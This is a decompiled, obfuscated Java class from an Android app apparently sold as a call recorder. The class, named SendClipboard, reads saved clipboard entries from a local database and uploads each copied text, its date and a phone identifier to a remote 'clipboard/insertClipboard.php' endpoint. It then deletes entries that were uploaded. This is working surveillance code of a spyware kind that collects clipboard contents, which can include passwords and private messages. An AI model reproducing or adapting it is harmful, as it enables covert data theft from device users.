package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.C0092y;
import a.c.b.N;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendClipboard */
public class f implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f270b;

    /* renamed from: a reason: collision with root package name */
    private final Context f271a;

    public f(Context context) {
        this.f271a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f271a.stopService(new Intent(this.f271a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:26:0x009a */
    public synchronized void run() {
        try {
            if (f270b) {
                a();
                return;
            }
            f270b = true;
            N n = new N(this.f271a);
            n.b();
            Cursor c2 = n.c();
            if (c2 != null && c2.getCount() > 0) {
                while (c2.moveToNext()) {
                    C0092y yVar = new C0092y();
                    yVar.a(c2.getInt(0));
                    yVar.b(c2.getString(1));
                    yVar.a(c2.getString(2));
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append("");
                    sb.append(e.e(this.f271a));
                    hashMap.put("idPhone", sb.toString());
                    hashMap.put("copiedText", yVar.c());
                    hashMap.put("date", yVar.a());
                    if (a.b("clipboard/insertClipboard.php", (Map<String, String>) hashMap)) {
                        n.a(yVar.b());
                    }
                }
            }
            n.a();
            if (c2 != null) {
                c2.close();
            }
            f270b = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
            Crashlytics.logException(e2);
        }
    }
}
